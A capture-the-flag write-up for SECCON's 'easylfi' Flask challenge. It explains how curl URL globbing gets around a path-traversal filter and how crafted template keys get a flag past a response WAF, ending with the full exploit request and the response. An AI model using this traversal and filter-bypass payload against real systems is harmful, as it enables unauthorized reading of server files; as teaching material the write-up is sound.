# easylfi

Description: Can you read my secret?

http://easylfi.seccon.games:3000

Download: https://dashboard.quals-score.seccon.jp/api/download?key=prod%2Feasylfi%2Feasylfi.tar.gz

---

## Tooling

To debug, test and finally solve the challenge I have used `docker`, `burp` and `curl` documentation.
Without testing the challenge locally, I wouldn't have been able to solve it.

---

## Application

The application is a simple web application written in `python3` using `flask` framework.
The only available endpoint was index, where the user could have `curl` files from the server and template them using query parameters surrounded by `{ }`. (e.g.: {test}=1 would replace all '{test}' in the file with '1'). The main function looks as follows:

```python
@app.route("/")
@app.route("/<path:filename>")
def index(filename: str = "index.html"):
    if ".." in filename or "%" in filename:
        return "Do not try path traversal :("

    try:
        proc = subprocess.run(
            ["curl", f"file://{os.getcwd()}/public/{filename}"],
            capture_output=True,
            timeout=1,
        )
    except subprocess.TimeoutExpired:
        return "Timeout"

    if proc.returncode != 0:
        return "Something wrong..."
    return template(proc.stdout.decode(), request.args)
```

As there is a call to `subprocess.run` we might suspect RCE, but it wasn't the case, the chall itself was even called `easylfi`, right?

### LFI - Local File Inclusion

is a vulnerability that allows an attacker to read files from the server. In this case, the attacker can read any file from the server, as long as it is in the `public` directory. The `curl` command is used to read the file, but the `filename` parameter is sanitized, so the attacker couldn't just use `../` to go up in the directory tree and read any file from the server. That was the **first** obstacle. 

The **second** obstacle was that there was a `after_reqest` decorator that looked as follows:

```python
@app.after_request
def waf(response: Response):
    if b"SECCON" in b"".join(response.response):
        return Response("Try harder")
    return response
```

So if the response contained the string `SECCON`, the response would be changed to `Try harder`. This was a problem, as the flag was in the `flag.txt` file, which was in format `SECCON{.*}`.

### Parameters

The only parameters that were acceptable for template replacement were determined by the following function:

```python
def validate(key: str) -> bool:
    # E.g. key == "{name}" -> True
    #      key == "name"   -> False
    if len(key) == 0:
        return False
    is_valid = True
    for i, c in enumerate(key):
        if i == 0:
            is_valid &= c == "{"
        elif i == len(key) - 1:
            is_valid &= c == "}"
        else:
            is_valid &= c != "{" and c != "}"
    return is_valid
```

So the parameters had to be surrounded by `{ }` and couldn't contain `{` or `}`. So there was no possibility to replace `SECCON` in any way (Or was it?), as it was not surrounded by `{ }`.

---

## Solution

### First step - Path Traversal check bypass

The first step was to make a path traversal. If we will look in to `curl`'s [man page](https://curl.se/docs/manpage.html), we can see that anything in the second argument *([options / URLs])* surrounded by curly braces, is treated as a list of possible options.

```example
"http://site.{one,two,three}.com"
```

Means that `curl` will make requests to `http://site.one.com`, `http://site.two.com` and `http://site.three.com` consecutively. So if we will use the following query:

```
{.}{.}/{.}{.}/flag.txt
```

it would have only one option (single dot) everywhere, and there will be our bypass to path traversal:

```python
if ".." in filename or "%" in filename:
    return "Do not try path traversal :("
```

It's always good to take a look into documentation while solving CTFs :)

### Second step - Bypass WAF

The second step was to bypass the WAF. The WAF was checking for the string `SECCON` in the response, so we had to replace it with something else. The only way to do that was to use the `template` function, which was replacing the parameters in the file. The only problem was that the parameters had to be surrounded by `{ }` and couldn't contain `{` or `}`. So we had to find a way to bypass that.

Again - curl feature came in handy. If we have more than one option:

```example
{a,b}/flag.txt
```

Subproccess will catch stdout from both `a/flag.txt` and `b/flag.txt` and will return both of them. That allowed me to combine the output of the flag.txt with *something* prefixing it.

```example
./flag.txt{\{,}
```

I have combined non existing file called `flag.txt{` and `flag.txt` by using `curl` cool feature
The first curl request would be sent to `flag.txt{` and `flag.txt`.
The output would be:

```
--_curl_--file:///app/public/../../flag.txt{
--_curl_--file:///app/public/../../flag.txt
SECCON{flag}
```

Which of course would have been blocked by the WAF.
However if we take a close look at `validate` function, we can see that we can actually use single '{' as a query parameter in request and the `validate` function would accept it. So we can use the following query:

```
?{=}{
```

Which will allow to have the rest of the output like this:

```
SECCON}{flag}
```

The last thing to do was to combine the output of the `flag.txt` with the `SECCON}` prefixing it. The following query parameter would do the trick:

```example
?{%0a%2D%2D%5Fcurl%5F%2D%2Dfile%3A%2F%2F%2Fapp%2Fpublic%2F%2E%2E%2F%2E%2E%2Fflag%2Etxt%0aSECCON}=a
```

It's practically the `curl` output from the previous step as a parameter **key**, but with the `SECCON}` at the end, so the template function would replace it with the `a` string and that would match the output of the second `curl` request.

#### Final exploiting request:

```http
GET /{.}{.}/{.}{.}/flag.txt{\{,}?{=}{&{%0a%2D%2D%5Fcurl%5F%2D%2Dfile%3A%2F%2F%2Fapp%2Fpublic%2F%2E%2E%2F%2E%2E%2Fflag%2Etxt%0aSECCON}=a HTTP/1.1
Host: easylfi.seccon.games:3000
Content-Length: 0
```

#### Response:

```http
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.10.8
Date: Sun, 13 Nov 2022 19:41:31 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 89
Connection: close

--_curl_--file:///app/public/../../flag.txt}a{i_lik3_fe4ture_of_copy_aS_cur1_in_br0wser}
```
